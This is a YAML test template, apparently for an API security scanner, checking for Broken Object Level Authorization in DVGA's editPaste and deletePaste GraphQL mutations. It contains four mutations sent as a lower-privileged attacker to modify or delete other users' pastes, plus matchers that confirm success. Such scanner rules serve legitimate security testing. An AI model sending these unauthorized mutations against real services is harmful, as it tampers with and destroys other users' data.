id: api1-bola-dvga
info:
  name: "DVGA - BOLA via editPaste/deletePaste"
  category: "API1:2023 Broken Object Level Authorization"
  severity: "HIGH"
  author: "hadrian"
  description: "Tests for Broken Object Level Authorization (BOLA) in DVGA's editPaste and deletePaste mutations. These mutations do not properly check if the authenticated user is the owner of the paste, allowing attackers to modify or delete pastes owned by other users."
  tags: ["graphql", "dvga", "bola", "authorization", "idor"]
  requires_llm_triage: true
  test_pattern: "simple"

endpoint_selector:
  requires_auth: true

role_selector:
  attacker_permission_level: "lower"
  victim_permission_level: "higher"

graphql:
  - query: |
      mutation BOLAEditPaste {
        editPaste(id: 1, title: "Modified by attacker", content: "Unauthorized modification") {
          paste {
            id
            title
            content
            ownerId
          }
        }
      }
    auth: "attacker"
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["editPaste", "paste"]
        part: body

  - query: |
      mutation BOLADeletePaste {
        deletePaste(id: 2) {
          result
        }
      }
    auth: "attacker"
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["deletePaste", "result"]
        part: body

  - query: |
      mutation BOLAEditVictimPaste {
        editPaste(id: {{victim_paste_id}}, title: "Compromised", content: "Attacker was here") {
          paste {
            id
            title
            ownerId
          }
        }
      }
    variables:
      victim_paste_id: "{{victim_paste_id}}"
    auth: "attacker"
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["data", "editPaste"]
        part: body

  - query: |
      mutation BOLADeleteVictimPaste {
        deletePaste(id: {{victim_paste_id}}) {
          result
        }
      }
    variables:
      victim_paste_id: "{{victim_paste_id}}"
    auth: "attacker"
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["true"]
        part: body

detection:
  success_indicators:
    - type: status_code
      status_code: 200
    - type: body_field
      body_field: "data.editPaste.paste"
      exists: true
    - type: body_field
      body_field: "errors"
      exists: false
  vulnerability_pattern: "dvga_bola_paste_manipulation"
